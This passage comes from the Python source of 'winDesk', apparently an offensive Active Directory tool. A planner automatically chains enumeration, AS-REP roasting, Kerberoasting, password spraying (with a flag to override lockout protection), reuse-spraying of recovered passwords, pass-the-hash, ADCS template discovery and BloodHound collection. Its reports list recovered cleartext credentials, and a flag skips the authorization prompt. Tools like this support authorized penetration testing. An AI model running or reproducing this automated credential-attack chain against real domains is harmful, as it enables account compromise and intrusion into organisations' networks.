        file against the budget only when budget is None/unlimited; otherwise we
        cap to `budget` lines. Single -p and description secrets are strings."""
        used = 0
        self._desc = h.__dict__.get("_desc_secrets", [])
        # 1) single -p password (highest priority — user explicitly gave it)
        if self.single_pass:
            yield {"arg": self.single_pass, "is_file": False}
            used += 1
            if budget is not None and used >= budget:
                return
        # 2) description-harvested secrets
        for s in self._desc:
            if budget is not None and used >= budget:
                return
            yield {"arg": s, "is_file": False}
            used += 1
        # 3) passlist
        if self.inp.has_passlist:
            pl = resolve_list(self.inp.passlist, "passlist")
            if pl:
                if budget is None:
                    yield {"arg": pl, "is_file": True}
                else:
                    # emit the first `budget-used` lines as individual strings
                    remaining = budget - used
                    if remaining > 0:
                        try:
                            with open(pl, errors="ignore") as f:
                                for ln in f:
                                    ln = ln.strip()
                                    if not ln:
                                        continue
                                    yield {"arg": ln, "is_file": False}
                                    remaining -= 1
                                    if remaining <= 0:
                                        break
                        except Exception:
                            pass

    def describe_plan(self, h):
        rows = []
        rows.append(["authenticate (-u + -p/-H)", "YES" if self.can_auth else "no"])
        rows.append(["pass-the-hash", "YES" if (self.single_user and self.nthash) else "no"])
        rows.append(["AS-REP roast (no password needed)",
                     "YES" if (self.inp.has_userlist or h.users or h.asrep_accounts)
                     and not self.args.safe else "no"])
        rows.append(["kerberoast (needs a valid cred)",
                     "when a cred is held" if not self.args.safe else "no (--safe)"])
        rows.append(["password spray", "YES" if self.can_spray else "no"])
        if self.can_spray:
            _, ud, nu = self.spray_user_source(h, self.args)
            rows.append(["  spray users", f"{ud}"])
            rows.append(["  spray passwords", self.spray_pass_desc()])
        tbl(["CREDENTIAL STRATEGY", "DECISION"], rows,
            title="CredentialStrategist — what your inputs enable")


# ============================================================================
#  EXPERT-SYSTEM PLANNER  ("the AI": forward + backward chaining, ranked, shown)
# ============================================================================
@dataclass
class Action:
    key: str
    base_conf: float       # intrinsic confidence this action advances the goal
    attack: str            # ATT&CK id(s)
    why: str               # human explanation
    precond: Callable[["Facts"], bool]
    ready: Callable[["Facts"], Tuple[bool, str]]  # (ready?, reason-if-not)
    tier: int = 0          # 0 = enumeration/discovery, 1 = credential-access attack
    loop: bool = True      # participates in the adaptive discovery loop


class Facts:
    """Snapshot of everything the planner reasons over for one host, this round."""
    def __init__(self, h: HostRecord, inp: Inputs, args, strat: CredentialStrategist,
                 cred: Optional[dict]):
        p = h.ports
        self.h = h
        self.port88 = 88 in p
        self.port389 = any(x in p for x in (389, 636, 3268, 3269))
        self.port445 = 445 in p or 139 in p
        self.port135 = 135 in p
        self.port53 = 53 in p
        self.any_proto = any(x in p for x in (445, 139, 389, 135, 53, 3389, 1433, 88))
        self.domain = bool(h.domain or inp.domain or args.domain)
        # domain is RESOLVABLE even if not yet known: identity/LDAP/SMB/DNS can reveal it
        self.domain_resolvable = self.domain or any(
            [self.port389, self.port88, self.port53, self.port445])
        self.users = len(h.user_names())
        # users are DISCOVERABLE even if none known yet
        self.users_discoverable = (self.users > 0 or inp.has_userlist or self.port445
                                   or self.port389 or (self.port88 and inp.has_userlist))
        self.has_cred = bool(cred and cred.get("username"))
        self.has_userlist = inp.has_userlist
        self.can_spray = strat.can_spray
        self.spn = bool(h.spn_accounts)
        self.asrep_surface = bool(h.asrep_accounts)
        self.hashes = len(h.hashes)
        self.uncracked_hashes = any(
            not any(c["username"].lower() == x["account"].lower() for c in h.credentials)
            for x in h.hashes)
        self.access = bool(h.credentials)
        self.ncreds = len(h.credentials)
        self.safe = args.safe
        self.strat = strat


def build_actions() -> List[Action]:
    return [
        # ---- tier 0: enumeration / discovery ----
        Action("nse", 0.3, "T1046",
               "protocol ports open → safe/discovery NSE fingerprinting",
               lambda f: f.any_proto, lambda f: (True, "")),
        Action("smb-null", 0.6, "T1135/T1087.002",
               "SMB present → null/guest probe; cascade shares/users/policy/RID",
               lambda f: f.port445, lambda f: (True, "")),
        Action("identity", 0.5, "T1016",
               "AD identity ports → resolve domain/forest (multi-source)",
               lambda f: any([f.port389, f.port88, f.port53, f.port445]),
               lambda f: (True, "")),
        Action("ldap-anon", 0.55, "T1087.002",
               "LDAP present & no cred → ANONYMOUS LDAP (users/SPN/AS-REP surface)",
               lambda f: f.port389 and not f.has_cred, lambda f: (True, "")),
        Action("impacket", 0.5, "T1087.002",
               "RPC/SMB → rpcdump/lookupsid/samrdump (anon; authed if cred)",
               lambda f: f.port135 or f.port445, lambda f: (True, "")),
        Action("kerb-userenum", 0.7, "T1087.002",
               "Kerberos + userlist + domain → kerbrute username validation",
               lambda f: f.port88,
               lambda f: (f.has_userlist and f.domain,
                          "need --userlist" if not f.has_userlist else
                          "domain unknown (resolves in the identity phase)")),
        # ---- tier 1: credential access WITHOUT a credential ----
        Action("asrep", 0.9, "T1558.004",
               "Kerberos + known users → AS-REP roast (no password needed), then crack",
               lambda f: f.port88 and f.domain and not f.safe,
               lambda f: (f.users > 0 or f.has_userlist or f.asrep_surface,
                          "no users known yet (run user discovery first)"), tier=1),
        Action("spray", 0.7, "T1110.003",
               "password source + known users → lockout-aware password spray",
               lambda f: f.port445 and f.can_spray and not f.safe,
               lambda f: (f.users > 0 or bool(f.strat.single_user) or f.has_userlist,
                          "no user source yet (run user discovery first)"),
               tier=1),
        # ---- tier 2: post-credential (need a valid credential) ----
        Action("kerberoast", 0.9, "T1558.003",
               "valid cred → Kerberoast (request TGS for SPN accounts), then crack",
               lambda f: f.port88 and f.domain and f.has_cred and not f.safe,
               lambda f: (True, ""), tier=2),
        Action("spray-reuse", 0.8, "T1110.004",
               "recovered password → reuse-spray it across every known user",
               lambda f: f.port445 and f.ncreds > 0 and not f.safe,
               lambda f: (f.users > 1, "need >1 user to reuse against"), tier=2),
        Action("ldap-auth", 0.85, "T1087.002",
               "valid cred → authenticated LDAP re-enumeration (full directory)",
               lambda f: f.port389 and f.has_cred, lambda f: (True, ""), tier=2),
        Action("adcs", 0.75, "T1649",
               "valid cred + AD CS → certipy find vulnerable templates (ESC1-ESC16)",
               lambda f: f.port389 and f.has_cred and not f.safe,
               lambda f: (True, ""), tier=2),
        Action("bloodhound", 0.7, "T1087.002",
               "valid cred → BloodHound collection for attack-path graphing",
               lambda f: f.port389 and f.has_cred,
               lambda f: (True, ""), tier=2),
    ]


class ExpertPlanner:
    """Transparent expert-system planner. Back-chains from the GOAL to the facts it
    still needs, forward-ranks ready actions by confidence × readiness, prints the
    full reasoning, and re-plans each round as new facts unlock new actions.
    Deterministic, offline — no LLM/NLP."""

    GOAL = "obtain valid AD credentials → access → chain further AD attacks"
    LOOP = ["nse", "smb-null", "identity", "ldap-anon", "impacket", "kerb-userenum",
            "asrep", "spray", "kerberoast", "spray-reuse", "ldap-auth", "adcs",
            "bloodhound"]

    def __init__(self, quiet=False):
        self.quiet = quiet
        self.actions = {a.key: a for a in build_actions()}

    def state_label(self, f: Facts):
        if f.access:
            cs = "ACCESS-GAINED"
        elif f.has_cred:
            cs = "CREDENTIALED"
        elif f.strat.can_spray and f.has_userlist:
            cs = "LISTS(user+pass)"
        elif f.has_userlist:
            cs = "USERLIST-ONLY"
        elif f.strat.single_pass and not f.strat.single_user:
            cs = "PASSWORD-ONLY(spray)"
        elif f.strat.can_spray:
            cs = "PASSLIST-ONLY"
        else:
            cs = "NO-CREDS"
        if f.users:
            cs += f"+USERS({f.users})"
        if f.domain:
            cs += "+DOMAIN"
        if f.hashes:
            cs += f"+HASHES({f.hashes})"
        return cs

    def backchain(self, f: Facts):
        """Back-chain the GOAL into credential-access paths. Each path is reported as
        one of three states — so the AI distinguishes 'ready now', 'will unlock after
        an earlier step runs' (pending), and 'genuinely impossible' (blocked). This is
        the reasoning that sequences domain→users→AS-REP→crack→cred→Kerberoast/reuse."""
        paths = []

        # AS-REP roast → crack
        if f.port88 and f.domain and (f.users > 0 or f.has_userlist or f.asrep_surface):
            paths.append(("AS-REP roast → crack", "ready", "Kerberos + users known"))
        elif f.port88 and f.domain_resolvable and f.users_discoverable:
            paths.append(("AS-REP roast → crack", "pending",
                          "unlocks after identity (domain) + user discovery"))
        elif f.port88:
            paths.append(("AS-REP roast → crack", "pending", "needs domain + a user source"))
        else:
            paths.append(("AS-REP roast → crack", "blocked", "no Kerberos (88) on target"))

        # Password spray → hit
        if f.port445 and f.can_spray and (f.users > 0 or f.has_userlist or f.strat.single_user):
            paths.append(("password spray → hit", "ready", "users + password source"))
        elif f.port445 and f.can_spray and f.users_discoverable:
            paths.append(("password spray → hit", "pending",
                          "unlocks after user discovery"))
        elif f.port445 and not f.can_spray:
            paths.append(("password spray → hit", "blocked",
                          "no password source (give --passlist or -p)"))
        else:
            paths.append(("password spray → hit", "blocked", "no SMB (445) on target"))

        # Kerberoast → crack  (needs a credential — provided by the two paths above)
        if f.has_cred and f.port88 and f.domain:
            paths.append(("Kerberoast → crack", "ready", "a credential is held"))
        elif f.port88 and (self._any_ready_credpath(f) or f.domain_resolvable):
            paths.append(("Kerberoast → crack", "pending",
                          "unlocks after AS-REP/spray yields the first credential"))
        else:
            paths.append(("Kerberoast → crack", "blocked", "no Kerberos (88) on target"))

        # Credential reuse (password spray the recovered secret everywhere)
        if f.ncreds > 0 and f.users > 1 and f.port445:
            paths.append(("credential reuse-spray", "ready",
                          f"{f.ncreds} recovered secret(s) vs {f.users} users"))
        elif f.port445:
            paths.append(("credential reuse-spray", "pending",
                          "unlocks after the first credential is recovered"))

        # Supplied credential
        if f.has_cred:
            paths.append(("use supplied credential", "ready", "supplied -u + -p/-H"))
        return paths

    def _any_ready_credpath(self, f: Facts):
        return ((f.port88 and f.domain and (f.users > 0 or f.has_userlist)) or
                (f.port445 and f.can_spray and (f.users > 0 or f.has_userlist
                                                or f.strat.single_user)))

    def rank(self, f: Facts, pending: Set[str]):
        """Forward-rank ready, not-yet-done actions by confidence × readiness."""
        scored = []
        for key in self.LOOP:
            if key in f.h.completed or key not in pending:
                continue
            a = self.actions[key]
            if not a.precond(f):
                continue
            ready, reason = a.ready(f)
            conf = a.base_conf * (1.0 if ready else 0.0)
            scored.append((conf, ready, reason, a))
        # methodology-correct order: all enumeration (tier 0) before any attack
        # (tier 1); within a tier, highest confidence first, then stable by key.
        scored.sort(key=lambda x: (x[3].tier, -x[0], x[3].key))
        return scored

    def print_plan(self, f: Facts):
        if self.quiet:
            return
        h = f.h
        plan(f"[{h.ip}] GOAL: {self.GOAL}")
        plan(f"[{h.ip}] state={self.state_label(f)}  open-ports={h.open_ports()}")
        plan(f"[{h.ip}] back-chain (credential-access paths to the goal):")
        marks = {"ready": ("✓ READY", C.GREEN),
                 "pending": ("⋯ PENDING", C.YELLOW),
                 "blocked": ("✗ blocked", C.GREY)}
        for name, state, reason in self.backchain(f):
            label, col = marks.get(state, ("?", C.GREY))
            _emit(f"      {_c(C.CYAN)}valid-credential ← {name:<24}{_c(C.RESET)} "
                  f"{_c(col)}{label:<10}{_c(C.RESET)} ({reason})")
            h.decisions.append(f"path {name}: {state} ({reason})")
        ranked = self.rank(f, set(self.LOOP))
        ready_list = [(c, rd, rs, a) for (c, rd, rs, a) in ranked if rd]
        pend_list = [(c, rd, rs, a) for (c, rd, rs, a) in ranked if not rd]
        if ready_list:
            plan(f"[{h.ip}] next actions (ready now, methodology-ordered):")
            for i, (conf, ready, reason, a) in enumerate(ready_list[:10], 1):
                _emit(f"      {_c(C.CYAN)}{i}. {a.key:<14}{_c(C.RESET)} conf={conf:.2f}  "
                      f"[{a.attack}]  {a.why}")
        if pend_list and not f.access:
            for (conf, ready, reason, a) in pend_list[:6]:
                _emit(f"      {_c(C.DIM)}⋯ {a.key:<14} pending: {reason}{_c(C.RESET)}")
        if f.access:
            win(f"[{h.ip}] {f.ncreds} credential(s) recovered — chaining post-credential "
                f"AD attacks (Kerberoast, reuse-spray, authed LDAP, ADCS, BloodHound).")


# ============================================================================
#  PER-HOST WORKFLOW  (adaptive: plan → act → re-plan until access or steady state)
# ============================================================================
def _current_cred(h, inp):
    """The best credential currently available: a recovered one beats a supplied one."""
    if h.credentials:
        c = h.credentials[0]
        return {"username": c["username"], "password": c.get("password", ""),
                "nthash": ""}
    if inp.has_cred:
        return {"username": inp.username, "password": inp.password, "nthash": inp.nthash}
    return None


def process_host(target, args, prof, engine, inp, seen):
    ip = resolve(target) or target
    if ip in seen:
        return
    seen.add(ip)
    h = STORE.host(ip, target)
    strat = CredentialStrategist(inp, args)

    head(f"HOST · {target} ({ip})")
    info(f"Approach: {prof.name}   Inputs: {inp.describe()}")

    # Phase 1: ports (TCP + UDP) → then service enumeration immediately after.
    safe(phase_ports, h, args, prof)
    safe(phase_services, h, args, prof)
    strat.describe_plan(h)

    def run_phase(key):
        cred = _current_cred(h, inp)
        if key == "nse":
            phase_nse(h, args, prof, inp)
        elif key == "smb-null":
            phase_smb_null(h, args, prof, inp)
        elif key == "identity":
            phase_identity(h, args)
        elif key == "ldap-anon":
            phase_ldap(h, inp, args, authed=False)
        elif key == "impacket":
            phase_impacket(h, inp, args, cred=cred)
        elif key == "kerb-userenum":
            phase_kerb_userenum(h, args, prof, inp)
        elif key == "asrep":
            phase_asrep(h, inp, args, prof)
        elif key == "spray":
            phase_spray(h, inp, args, prof, strat)
        elif key == "kerberoast":
            phase_kerberoast(h, inp, args, prof, cred=cred)
        elif key == "spray-reuse":
            phase_spray_reuse(h, inp, args, prof)
        elif key == "ldap-auth":
            phase_ldap(h, inp, args, authed=True, cred=cred)
            if (445 in h.ports or 139 in h.ports) and not done(h, "smb-auth"):
                safe(smb_enumerate, h, prof, False, cred["username"],
                     cred.get("password", ""), cred.get("nthash", ""),
                     h.domain or inp.domain or args.domain or "", inp.local_auth)
                mark(h, "smb-auth")
        elif key == "adcs":
            phase_adcs(h, inp, args, cred=cred)
        elif key == "bloodhound":
            phase_bloodhound(h, inp, args, cred=cred)

    # Adaptive loop: pick the SINGLE highest-priority ready action, run it, then
    # re-plan. New facts (a domain, usernames, a crackable hash, a recovered
    # credential) unlock later actions, so the AI naturally sequences
    # domain → users → AS-REP → crack → cred → Kerberoast/reuse/authed-enum.
    max_steps = 40
    attempted: Set[str] = set()
    for step in range(max_steps):
        cred = _current_cred(h, inp)
        f = Facts(h, inp, args, strat, cred)
        engine.print_plan(f)
        if f.access and args.stop_at_access:
            win(f"[{h.ip}] --stop-at-access set: halting at first credential.")
            break
        ranked = engine.rank(f, set(engine.LOOP))
        nxt = next((a for (conf, ready, reason, a) in ranked
                    if ready and not done(h, a.key) and a.key not in attempted), None)
        if nxt is None:
            break
        attempted.add(nxt.key)
        plan(f"[{h.ip}] ▶ executing '{nxt.key}' (next best action)")
        safe(run_phase, nxt.key)
        prof.jitter()

    # Finalizers
    safe(phase_playbook, h, inp, args)
    safe(correlate, h)
    compute_next(h)
    _render_credentials(h)
    _host_summary(h)


def _host_summary(h):
    head(f"SUMMARY · {h.hostname or h.ip}")
    access = "YES — stopped at access" if h.credentials else "no"
    tbl(["FIELD", "VALUE"], [
        ["IP", h.ip], ["Hostname", h.hostname or "-"], ["FQDN", h.fqdn or "-"],
        ["OS", f"{h.os_family or '-'} ({clabel(h.os_confidence)})"],
        ["Domain", h.domain or "-"],
        ["Role", f"{h.role or '-'} ({clabel(h.role_confidence)})"],
        ["Open ports", str(len(h.ports))], ["Users", str(len(h.users))],
        ["Shares", str(len(h.shares))],
        ["SPN / AS-REP surface", f"{len(h.spn_accounts)} / {len(h.asrep_accounts)}"],
        ["Roasted hashes", str(len(h.hashes))],
        ["VALID CREDENTIALS", str(len(h.credentials))],
        ["ACCESS", access],
        ["Delegation", str(len(h.delegation))], ["Findings", str(len(h.findings))],
    ])
    if h.credentials:
        win(f"ACCESS GAINED on {h.hostname or h.ip} — {len(h.credentials)} credential(s) "
            f"recovered and chained for further AD enumeration. "
            f"winDesk stops before interactive access / secretsdump / DCSync / lateral "
            f"movement (operator-driven, see playbook).")


# ============================================================================
#  REPORTING
# ============================================================================
def save_report(args, prof):
    os.makedirs(args.output, exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    jpath = os.path.join(args.output, f"windesk_{ts}.json")
    mpath = os.path.join(args.output, f"windesk_{ts}.md")
    with open(jpath, "w", encoding="utf-8") as f:
        json.dump({"tool": f"winDesk v{__version__}", "approach": prof.name, "ts": ts,
                   "scope": "enumeration + credential access + post-credential AD "
                            "enumeration (no interactive access / secretsdump / DCSync / "
                            "lateral movement)",
                   "tool_versions": STORE.tool_versions,
                   "hosts": {ip: hh.to_json() for ip, hh in STORE.hosts.items()}},
                  f, indent=2, default=str)
    with open(mpath, "w", encoding="utf-8") as f:
        f.write(f"# winDesk v{__version__} Report — {ts} UTC\n\n")
        f.write(f"- Approach: **{prof.name}**\n- Scope: **enumeration + credential "
                f"access + post-credential AD enumeration** (no interactive access / "
                f"secretsdump / DCSync / lateral movement)\n")
        f.write("- Tools: " + ", ".join(f"{k}={v}" for k, v in STORE.tool_versions.items()) +
                "\n\n")
        dcs = [h for h in STORE.hosts.values() if h.role and "Domain Controller" in h.role]
        creds = sum(len(h.credentials) for h in STORE.hosts.values())
        f.write("## Executive Summary\n\n")
        f.write(f"- Hosts: **{len(STORE.hosts)}** · DCs: **{len(dcs)}**\n")
        f.write(f"- Accounts discovered: **{sum(len(h.users) for h in STORE.hosts.values())}**\n")
        f.write(f"- Kerberoast surface: **{sum(len(h.spn_accounts) for h in STORE.hosts.values())}**"
                f" · AS-REP surface: **{sum(len(h.asrep_accounts) for h in STORE.hosts.values())}**\n")
        f.write(f"- Roasted hashes: **{sum(len(h.hashes) for h in STORE.hosts.values())}**"
                f" · **VALID CREDENTIALS: {creds}**\n\n")
        for ip, h in STORE.hosts.items():
            f.write(f"---\n\n## {h.hostname or ip} ({ip})\n\n")
            f.write(f"- OS: {h.os_family or '-'} | Domain: {h.domain or '-'} | "
                    f"Role: {h.role or '-'} ({clabel(h.role_confidence)})\n")
            f.write(f"- ACCESS: {'**YES — stopped at access**' if h.credentials else 'no'}\n\n")
            if h.ports:
                f.write("### Ports\n\n| Port | Service | Version |\n|---|---|---|\n")
                for p in sorted(h.ports):
                    d = h.ports[p]
                    f.write(f"| {p}/{d.get('proto', 'tcp')} | {d.get('service', '')} | "
                            f"{d.get('version', '')} |\n")
                f.write("\n")
            if h.shares:
                f.write("### Shares\n\n")
                for s in h.shares:
                    f.write(f"- `{s.get('name')}` {s.get('permissions', '')} "
                            f"{s.get('remark', '')}\n")
                f.write("\n")
            if h.users:
                f.write(f"### Accounts ({len(h.users)})\n\n")
                for u in h.users[:300]:
                    f.write(f"- {u.get('username', '')} [{u.get('source', '?')}]\n")
                f.write("\n")
            if h.credentials:
                f.write(f"### VALID CREDENTIALS ({len(h.credentials)})\n\n")
                f.write("| Username | Password / Secret | Source | Admin |\n"
                        "|---|---|---|---|\n")
                for c in h.credentials:
                    f.write(f"| `{c.get('domain', '')}\\{c['username']}` | "
                            f"`{c.get('password', '') or '(hash/empty)'}` | "
                            f"{c.get('source', '')} | "
                            f"{'yes' if c.get('admin') else ''} |\n")
                f.write("\n")
            if h.findings:
                f.write("### Findings\n\n")
                sev_order = {"critical": 5, "high": 4, "medium": 3, "low": 2,
                             "informational": 1}
                for fi in sorted(h.findings, key=lambda x: sev_order.get(x.get("severity"), 0),
                                 reverse=True):
                    f.write(f"#### {fi['title']} — {fi['severity'].upper()}\n\n")
                    f.write(f"- Confidence: {fi['confidence_label']} | {fi['validation']}\n")
                    f.write(f"- Observed: {fi['observed']}\n")
                    if fi.get("attack"):
                        f.write(f"- ATT&CK: {', '.join(fi['attack'])}\n")
                    if fi.get("cwe"):
                        f.write(f"- CWE: {fi['cwe']}\n")
                    if fi.get("next_step"):
                        f.write(f"- Next: {fi['next_step']}\n")
                    f.write("\n")
            if h.playbook:
                f.write("### Operator Next-Step Playbook (post-access, manual, authorized)\n\n")
                for i, p in enumerate(h.playbook):
                    f.write(f"**{i + 1}. {p['label']}** ({p['attack']}) — {p['why']}\n\n")
                    f.write(f"```\n{p['cmd']}\n```\n\n")
            if h.decisions:
                f.write("### Decision-Engine Reasoning Log\n\n")
                for d in h.decisions:
                    f.write(f"- {d}\n")
                f.write("\n")
    ok(f"JSON report : {jpath}")
    ok(f"Markdown    : {mpath}")


# ============================================================================
#  TARGET EXPANSION
# ============================================================================
def expand_targets(raw_items, target_file):
    tokens = []
    for item in raw_items or []:
        tokens += [t for t in re.split(r"[,\s]+", item) if t]
    if target_file:
        if target_file == "-":
            tokens += [t.strip() for t in sys.stdin.read().split() if t.strip()]
        elif os.path.exists(target_file):
            for line in open(target_file, errors="ignore"):
                line = line.split("#", 1)[0].strip()
                tokens += [t for t in re.split(r"[,\s]+", line) if t]
        else:
            warn(f"--target-file '{target_file}' not found")
    out = []
    for t in tokens:
        t = norm_target(t)
        if not t:
            continue
        if "/" in t:
            try:
                net = ipaddress.ip_network(t, strict=False)
                out += [str(ip) for ip in (net.hosts() if net.num_addresses > 2 else net)]
                continue
            except Exception:
                pass
        m = re.match(r"^(\d+\.\d+\.\d+\.)(\d+)-(\d+)$", t)
        if m and 0 <= int(m.group(2)) <= int(m.group(3)) <= 255:
            out += [f"{m.group(1)}{i}" for i in range(int(m.group(2)), int(m.group(3)) + 1)]
            continue
        m = re.match(r"^(\d+\.\d+\.\d+\.\d+)-(\d+\.\d+\.\d+\.\d+)$", t)
        if m:
            try:
                a, b = int(ipaddress.ip_address(m.group(1))), int(ipaddress.ip_address(m.group(2)))
                if a <= b < a + 65536:
                    out += [str(ipaddress.ip_address(i)) for i in range(a, b + 1)]
                    continue
            except Exception:
                pass
        out.append(t)
    return list(dict.fromkeys(out))


def record_tool_versions():
    def ver(cmd):
        rc, t = run(cmd, timeout=10)
        return t.strip().splitlines()[0].strip() if rc == 0 and t.strip() else None
    if have("nmap"):
        STORE.tool_versions["nmap"] = ver(["nmap", "--version"]) or "installed"
    nxc = nxc_bin()
    if nxc:
        STORE.tool_versions["netexec/cme"] = \
            f"{os.path.basename(nxc)} {ver([nxc, '--version']) or ''}".strip()
    if IMPACKET_LIB:
        try:
            STORE.tool_versions["impacket"] = f"v{importlib.metadata.version('impacket')}"
        except Exception:
            STORE.tool_versions["impacket"] = "installed"
    elif impacket_tool("GetNPUsers"):
        STORE.tool_versions["impacket"] = "CLI examples"
    if LDAP3_LIB:
        STORE.tool_versions["ldap3"] = "installed"
    for n in ("kerbrute", "hashcat", "john", "certipy-ad", "certipy", "bloodhound-python",
              "ldapsearch", "dig", "snmpwalk", "showmount"):
        if which_any(n):
            STORE.tool_versions.setdefault(n, "installed")


# ============================================================================
#  CLI
# ============================================================================
def build_parser():
    p = argparse.ArgumentParser(
        prog="winDesk.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="winDesk v1.0 — Windows/AD enumeration + credential-access engine, "
                    "driven by a transparent expert-system planner. Chains attacks with "
                    "recovered creds. Authorized use only.",
        epilog=textwrap.dedent("""\
            Every input is optional and ANY combination works — the planner adapts:

              %(prog)s 10.0.0.0/24                          # null/anon sweep
              %(prog)s 10.0.0.0/24 192.168.1.5,192.168.1.6   # subnet + multiple IPs
              %(prog)s 10.0.0.10 --userlist users.txt        # kerbrute + AS-REP roast
              %(prog)s 10.0.0.10 --userlist u.txt --passlist p.txt   # + spray + crack
              %(prog)s 10.0.0.10 -p 'Summer2025!'            # spray ONE password at all users
              %(prog)s 10.0.0.10 -d corp.local -u svc -p 'P@ss'      # authenticated
              %(prog)s 10.0.0.10 -d corp.local -u svc -H <NThash>    # pass-the-hash reads
              %(prog)s 10.0.0.0/24 --approach stealthy --userlist u.txt --passlist p.txt

            Adaptive chain (keeps going using what it recovers):
              discover → users → AS-REP roast → crack → Kerberoast → spray → reuse-spray
              → authed LDAP/SMB → certipy (ADCS) → BloodHound.
              --stop-at-access halts at the first credential.
              --safe turns off all credential-access attacks (enumeration + playbook only).

            Long-running steps are time-boxed (default 5 min each) — see the
            'attack / spray / crack' options to disable or change the limits.

            Aliases: -iL/--target-file, -U/--userlist, -P/--passlist
        """))
    p.add_argument("targets", nargs="*", help="IP/host/CIDR/range(a.b.c.d-e)/comma-list")
    p.add_argument("--target-file", "-iL", dest="target_file",
                   help="file of targets (or '-' for stdin)")
    g = p.add_argument_group("inputs (all optional, ANY combination)")
    g.add_argument("-d", "-D", "--domain", dest="domain", help="AD/DNS domain")
    g.add_argument("-u", "--username", help="username (or spray seed)")
    g.add_argument("-p", "--password", help="password (if no -u: sprayed at all known users)")
    g.add_argument("-H", "--hashes", dest="hashes", help="NT hash (LM:NT or :NT) for PtH reads")
    g.add_argument("-k", "--kerberos", action="store_true", help="use Kerberos (-k) where supported")
    g.add_argument("--local-auth", action="store_true", help="treat account as local")
    g.add_argument("--userlist", "--userfile", "-U", dest="userlist",
                   help="usernames (kerbrute userenum, AS-REP roast, spray source)")
    g.add_argument("--passlist", "--passfile", "--wordlist", "-P", dest="passlist",
                   help="passwords/wordlist (spray + offline cracking)")
    a = p.add_argument_group("approach / engine")
    a.add_argument("--approach", choices=["noisy", "stealthy"], default="noisy",
                   help="noisy=lab/pentest (fast,loud); stealthy=red-team/prod (slow,quiet)")
    a.add_argument("--safe", action="store_true",
                   help="enumeration + playbook only — do NOT execute roast/spray/crack")
    a.add_argument("--stop-at-access", action="store_true",
                   help="halt at the first recovered credential (default: keep chaining "
                        "post-credential AD enumeration)")
    a.add_argument("--no-bloodhound", action="store_true",
                   help="skip the authenticated BloodHound collection step")
    a.add_argument("--quiet-plan", action="store_true", help="hide planner reasoning")
    a.add_argument("--threads", type=int, default=3, help="concurrent hosts (noisy only)")
    a.add_argument("--full-tcp", action="store_true",
                   help="force full -p- TCP scan (default ON for --approach noisy)")
    a.add_argument("--fast-ports", action="store_true",
                   help="scan only the curated AD/Windows port set, not all 65535")
    a.add_argument("--os-scan", action="store_true", help="force nmap -O")
    a.add_argument("--no-os-scan", action="store_true", help="disable nmap -O")
    a.add_argument("--no-udp", action="store_true", help="skip targeted UDP")
    a.add_argument("--no-graph", action="store_true", help="do not expand DCs via DNS SRV")
    a.add_argument("--min-rate", type=int, default=2000,
                   help="nmap --min-rate for the noisy stage-1 all-port sweep (default 2000)")
    s = p.add_argument_group("attack / spray / crack (all long steps are time-boxed)")
    s.add_argument("--force-spray", action="store_true",
                   help="override the lockout guard (spray the full password list)")
    s.add_argument("--no-crack", action="store_true",
                   help="retrieve roast hashes but do not attempt offline cracking")
    s.add_argument("--crack-timeout", type=int, default=300,
                   help="seconds to spend cracking each hash set (default 300 = 5 min)")
    s.add_argument("--spray-timeout", type=int, default=300,
                   help="seconds per spray sweep (default 300 = 5 min)")
    s.add_argument("--no-spray-timeout", action="store_true",
                   help="disable the spray timeout entirely (progress still printed)")
    k = p.add_argument_group("kerbrute")
    k.add_argument("--kerbrute-timeout", type=int, default=300,
                   help="kerbrute timeout seconds (default 300 = 5 min; a notice prints "
                        "while it runs)")
    k.add_argument("--no-kerbrute-timeout", action="store_true",
                   help="disable the kerbrute timeout entirely (progress still printed)")
    o = p.add_argument_group("output")
    o.add_argument("-o", "--output", default="./windesk_out", help="output directory")
    o.add_argument("--raw", action="store_true", help="also print raw tool output")
    o.add_argument("--no-color", action="store_true", help="disable ANSI colour")
    m = p.add_argument_group("module toggles")
    for flag, ht in (("--no-nmap", "native scan instead of nmap"), ("--no-nse", "skip NSE"),
                     ("--no-ldap", "skip LDAP phase"), ("--no-impacket", "skip impacket phase"),
                     ("--no-services", "skip service enum")):
        m.add_argument(flag, action="store_true", help=ht)
    p.add_argument("--nmap-timeout", type=int, default=600, help="per-nmap timeout (default 600)")
    p.add_argument("-y", "--yes", action="store_true", help="skip authorization prompt (automation)")
    p.add_argument("--self-test", action="store_true",
                   help="run built-in logic tests (no network) and exit")
    p.add_argument("--version", action="version", version=f"winDesk v{__version__}")
    return p


# ============================================================================
#  SELF-TEST  (offline logic verification — proves the engine is error-free)
# ============================================================================
def self_test():
    import argparse as _a
    passed = 0
    failed = 0

    def check(name, cond):
        nonlocal passed, failed
        if cond:
            passed += 1
            ok(f"PASS · {name}")
        else:
            failed += 1
            fail(f"FAIL · {name}")

    head(f"winDesk v{__version__} · Self-Test (offline logic)")

    # target expansion
    t = expand_targets(["10.0.0.1,10.0.0.2", "10.0.0.5-7"], None)
    check("expand comma+range", t == ["10.0.0.1", "10.0.0.2", "10.0.0.5", "10.0.0.6", "10.0.0.7"])
    t = expand_targets(["10.0.0.0/30"], None)
    check("expand CIDR /30", t == ["10.0.0.1", "10.0.0.2"])

    # spray budget / lockout guard
    check("lockout=0 → unlimited", _spray_budget("0", 100, False)[0] is None)
    check("lockout None → 1/user", _spray_budget(None, 100, False)[0] == 1)
    check("lockout=5 → cap 3", _spray_budget("5", 100, False)[0] == 3)
    check("lockout=2 → blocked", _spray_budget("2", 100, False)[0] == 0)
    check("force overrides guard", _spray_budget("2", 100, True)[0] is None)

    # credential strategist combinations
    base = dict(domain="", username="", password="", nthash="", userlist="", passlist="",
                local_auth=False, kerberos=False)
    args = _a.Namespace(safe=False, output="./windesk_out")

    def strat_for(**kw):
        d = dict(base)
        d.update(kw)
        return CredentialStrategist(Inputs(**d), args)

    check("password-only → can_spray", strat_for(password="P@ss").can_spray)
    check("userlist-only → cannot_spray", not strat_for(userlist="u.txt").can_spray)
    check("user+pass → can_auth", strat_for(username="a", password="b").can_auth)
    check("user+hash → PtH auth", strat_for(username="a", nthash="0" * 32).can_auth)
    check("passlist-only → can_spray", strat_for(passlist="p.txt").can_spray)
    check("safe mode disables spray",
          not CredentialStrategist(Inputs(password="x", **{k: v for k, v in base.items()
                                   if k != "password"}),
                                   _a.Namespace(safe=True, output=".")).can_spray)

    # planner: forward ranking + backward chaining on a synthetic DC
    h = HostRecord(ip="10.0.0.10", domain="corp.local")
